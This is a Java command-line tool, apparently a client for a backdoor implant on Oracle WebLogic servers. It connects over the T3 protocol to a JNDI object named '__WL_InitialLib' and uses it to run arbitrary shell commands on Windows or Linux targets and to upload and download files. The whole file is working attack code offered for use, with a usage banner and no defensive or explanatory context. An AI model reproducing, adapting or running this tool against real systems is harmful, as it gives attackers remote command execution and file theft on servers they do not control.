import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import javax.naming.InitialContext;
import Utils.RyClient;
import weblogic.jndi.internal.InitApp;

public class shellApp {
	private static InitialContext Ic;
	private static InitApp App;
	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		if(args.length<4){
			printUsage();
			return;
		}	
		String host=args[0];
		String port=args[1];
		String os=args[2];
		String cmd=args[3];
		String result = null;
		if(getApp(host,port)){
			result=execute(os,cmd,args);
		}
		System.out.println(result);
	}
	private static void printUsage(){
		System.out.println("Usage:java shellApp [HOST] [PORT] [OS] [CMD]");
		System.out.println("\tOS:win|linux");
		System.out.println("\tCMD:putfile [localfile] [remotefile]");
		System.out.println("\t    getfile [remotefile] [localfile]");
		System.out.println("\t    [windows or linux cmd]");
		
	}
	private static boolean getApp(String host,String port){
		try
        {
			Ic = RyClient.getInitialContext("t3://" + host + ":" + port);
			App = ((InitApp)Ic.lookup("__WL_InitialLib"));
			return true;
        }
        catch (Exception ex)
        {
          System.err.println("An exception occurred: " + ex.getMessage());
          return false;
        }
	}
	private static String execute(String os,String cmd,String []args){
		String []cmdArray=new String[3];
		if(cmd.equals("putfile") || cmd.equals("getfile")){
			if(args.length!=6){
				return "please set the localfile and remotefile";
			}
			if(cmd.equals("putfile")){
				return putFile(args[4],args[5]);
			}
			else{
				return getFile(args[4],args[5]);
			}	
		}
		if(os.equals("win")){
			cmdArray[0] = "cmd.exe";
			cmdArray[1] = "/c";
		}
		else{
			cmdArray[0] = "/bin/sh";
			cmdArray[1] = "-c";
		}
		cmdArray[2] = cmd;
		
		return App.runCmd(cmdArray);
	}
	private static String putFile(String localFile,String remoteFile){
		try {
			File file = new File(localFile);  
	        Long filelength = file.length();  
	        byte[] filecontent = new byte[filelength.intValue()];  	         
            FileInputStream in = new FileInputStream(file);  
            in.read(filecontent);  
            in.close();  
        
            return App.putFile(filecontent, remoteFile);
            
        } catch (Exception e) {  
            e.printStackTrace();  
            return e.getMessage(); 
        } 
	}
	private static String getFile(String remoteFile,String localFile){
		try{
			byte[] filecontent=App.getFile(remoteFile);
			if(filecontent == null || filecontent.length==0){
				return "get remote file fail";
			}
            DataOutputStream out=new DataOutputStream(      
                                 new BufferedOutputStream(      
                                 new FileOutputStream(localFile)));    
            out.write(filecontent);
            out.close();      
            
            return "ok";
        } catch (Exception e)      
        {      
            e.printStackTrace();
            return e.getMessage();
        }    
	}
}
